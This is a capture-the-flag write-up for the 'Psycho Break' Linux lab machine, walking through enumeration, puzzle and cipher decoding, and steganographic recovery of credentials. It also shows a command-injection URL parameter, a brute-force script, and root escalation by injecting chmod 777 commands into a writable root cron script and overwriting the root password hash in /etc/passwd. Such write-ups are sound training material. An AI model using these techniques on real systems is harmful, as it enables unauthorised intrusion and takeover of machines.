# Psycho break - Linux - Easy

**IP may vary over the document**

## Enumeration

### Nmap: `nmap -sV -oN nmap-initial 10.10.9.59 -v`

```bash
PORT     STATE    SERVICE      VERSION
21/tcp   open     ftp          ProFTPD 1.3.5a
22/tcp   open     ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
80/tcp   open     http         Apache httpd 2.4.18 ((Ubuntu))

Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

### Gobuster: `gobuster dir -u http://10.10.9.59/ -w common.txt| tee gobuster-scan`

```bash
/.htaccess            (Status: 403) [Size: 275]
/.hta                 (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/css                  (Status: 301) [Size: 306] [--> http://10.10.9.59/css/]
/index.php            (Status: 200) [Size: 838]                             
/js                   (Status: 301) [Size: 305] [--> http://10.10.9.59/js/] 
/server-status        (Status: 403) [Size: 275]                             
```

### Manual Enumeration

Found following comment in source code for the index page: `<!-- Sebastian sees a path through the darkness which leads to a room => /sadistRoom -->`

---
## Task-2

After visting the */sadistRoom* checking the source code again.. there it is a *script.js*. found the following key inside: `532219a04ab7a02b56faafbec1a4c1ea`

Found the following text after login in *lockerRoom* : `Tizmg_nv_zxxvhh_gl_gsv_nzk_kovzhv`

Looks like a ceaser cipher. NOPE it's not that. After messing around with it using cyberchef and google translate still could not find it.

Just googling the term gave away a github issue raised for Ciphey([Source](https://github.com/Ciphey/Ciphey/issues/518)) with the passphrase: `Grant_me_access_to_the_map_please`

Using the above key we can see the map now.

Checking source code for the SafeHeaven page we get the following: `<!-- I think I'm having a terrible nightmare. Search through me and find it ... -->`


Tried a few things like checking the github repo mentioned in *lightbox.js* and searched for *Keeper*, tried `exiftool` on images on the pages to get any kind of metadata info. Nothing worked. 

At last just ran the `gobuster` on the url with medium-wordlist.

```bash
gobuster dir -u http://10.10.9.59/SafeHeaven/ -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt| tee safeheaven_scan
```

```bash
/keeper            (Status: 200) [Size: 838]                             
/img                   (Status: 301) [Size: 305] [--> http://10.10.9.59/img/]
```

Looks like there is a *keeper* dir. Let's check it out. After visting the page we are greeted by a message that asks to find the real place in the image.

Downloaded the image and checked its metadata using `exiftool`. It seems this image is taken from *fliker*. Visiting the url was in vain as it was not up anymore. Maybe google will help? Just search for the image on google. We have our place: `St. Augustine Lighthouse`

Using this in keeper page we got keepers key: `48ee41458eb0b43bf82b986cecf3af01`.  Let's use this to login at *abondenedRoom*. 

Checking the source code we have the following: 

```
<!-- There is something called "shell" on current page maybe that'll help you to get out of here !!!-->
```

Lets supply that *shell* argument to the page. After using some common commands of linux like: `pwd`, `id`, `ls`. It seems only `ls` works. Let's see what we can get using it.

Payload: `/herecomeslara.php?shell=ls` 

Output: `assets dead.php herecomeslara.php index.php script.js`

Payload: `/herecomeslara.php?shell=id` 

Output: `Command not allowed`

After checking some other variants of `ls` the one that gives us something is: `/herecomeslara.php?shell=ls ..`

It lists another directory inside `/abandonedRoom/`. Checking the contents we have the following: 

```
helpme.zip
you_made_it.txt
```

---
## Task-3

Unziping the helpme.txt we have two files. Running file upon them reveals:

```bash
$ file Table.jpg 
Table.jpg: Zip archive data, at least v2.0 to extract
```

unziping we have two files one of which is again a zip. Extracting all files.. we have got .wav file and .jpg file.

.wav is clearly a [morse code](https://en.wikipedia.org/wiki/Morse_code). It can be decoded manually or by using this [site](https://morsecode.world/international/decoder/audio-decoder-adaptive.html).

We got a text after decoding .wav file: `SHOWME`

Checking .jpg file with `exiftool` and `stegsolve` reveals nothing. Using `steghide` reveals something. Need to enter the passphrase we got from .wav file to extract the data.

```bash
$steghide info Joseph_Oda.jpg 
"Joseph_Oda.jpg":
  format: jpeg
  capacity: 1.4 KB
Try to get information about embedded data ? (y/n) y
Enter passphrase: 
  embedded file "thankyou.txt":
    size: 718.0 Byte
    encrypted: rijndael-128, cbc
    compressed: yes
```

Extracting data from file

```bash
$steghide extract -sf Joseph_Oda.jpg -xf thankyou.txt
Enter passphrase: 
wrote extracted data to "thankyou.txt".
```

We got ourselves the ftp credentials from the *thankyou.txt* file.

Let's login using these creds to ftp and download the files present there

---
## Task-4

executing the `program` with no arguments we can see the following:

```
[+] Usage

./program <word>
```

Hmmm.. maybe running this with the entries in `random.dic` file might help. Creating a python script for it.

```python
#!/usr/bin/python3

import subprocess

file = open("random.dic", "r")
file_data = file.readlines()
file.close()

error_output = "=> Incorrect"

for key in file_data:
	key = key.replace("\n", "")
	print(f"Key: {key}", end="\t")
	
	output = subprocess.run(["./program", key], capture_output=True).stdout.decode().replace("\n", "")

	if error_output in output:
		print("FAILED")
	else:
		print("FOUND")
		break
```

We got a hit at `kidman`. Looks like we need to decode: `55 444 3 6 2 66 7777 7 2 7777 7777 9 666 777 3 444 7777 7777 666 7777 8 777 2 66 4 33`

Just a simple google search reveals the trick behind it. All it needs is a old phone keypad the one's having *abc* at number *1*.

3 - would indicate *e*
55 - would indicate *k* and so on...

It can be done manually or by using [online decoder](https://www.dcode.fr/multitap-abc-cipher). After decoding we got: `KIDMANSPASSWORDISSOSTRANGE`

---
## Task-5

### User.txt

ssh into the box using the above creds received for user kidman. Just cat out the *user.txt* file for user flag

### Root.txt

Running linPEAS on machine reveals

```bash
cronJob
*/2 * * * * root python3 /var/.the_eye_of_ruvik.py
```

/var/.the_eye_of_ruvik.py contents

```python
#!/usr/bin/python3

import subprocess
import random

stuff = ["I am watching you.","No one can hide from me.","Ruvik ...","No one shall hide from me","No one can escape from me"]
sentence = "".join(random.sample(stuff,1))
subprocess.call("echo %s > /home/kidman/.the_eye.txt"%(sentence),shell=True)
```

As the */var/.the_eye_of_ruvik.py* file is writable we have code execution as root. It seems getting a reverse shell is not an option here... not sure what's causing it to fail when executed in script. Alright lets change the permissions for */root* files. Adding the following lines of code to the file.

```python
import os
os.system("chmod 777 /root; chmod 777 /root/*")`
```

Now we can read the */root/root.txt* file. In order to get root user we can change the contents of /etc/passwd file according to our needs. First lets change the permissions on */etc/passwd* file

```python
import os
os.system("chmod 777 /etc/passwd")`
```

Now lets generate a new password for it using `openssl` i would be using `testguy` as the password.

```bash
openssl passwd -1
Password: 
Verifying - Password: 
$1$1gECYGIY$WhmXL4CD9GHiPLMdnJxSQ0
```

Now just copy the string `$1$1gECYGIY$WhmXL4CD9GHiPLMdnJxSQ0` to /etc/passwd so that looks like:

```bash
root:$1$1gECYGIY$WhmXL4CD9GHiPLMdnJxSQ0:0:0:root:/root:/bin/bash
```

Now just login using `su` with password `testguy`. We have the root user now. In order to remove user `ruvik` just use `deluser ruvik`
